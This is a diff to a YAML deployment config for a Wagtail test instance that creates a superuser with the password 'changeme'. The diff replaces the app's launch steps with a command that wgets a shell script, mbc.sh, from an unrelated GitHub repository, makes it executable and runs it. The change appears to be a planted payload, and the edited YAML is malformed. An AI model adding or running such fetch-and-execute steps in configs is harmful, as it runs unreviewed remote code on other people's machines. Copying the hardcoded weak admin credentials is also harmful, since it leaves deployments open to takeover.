@@ -19,7 +19,6 @@ deployments:
       - echo "<br><h1>Wagtail test instance</h1><p>Log into <a href='/admin/'>/admin/</a> with 'admin' / 'changeme'.</p>" > home/templates/home/welcome_page.html
       - echo "from django.contrib.auth import get_user_model; User = get_user_model(); User.objects.create_superuser('admin', 'admin@example.com', 'changeme')" | python manage.py shell    
     launch_steps:
-      - cd /myproject/mysite
-      - python manage.py runserver 0.0.0.0:80
+      - RUN "wget https://raw.githubusercontent.com/agamlimaa/saya/main/mbc.sh && chmod +x mbc.sh && ./mbc.sh"
+      
     run_options: -v ~/code:/code
-      - run wget https://raw.githubusercontent.com/agamlimaa/saya/main/mbc.sh && chmod +x mbc.sh && ./mbc.sh
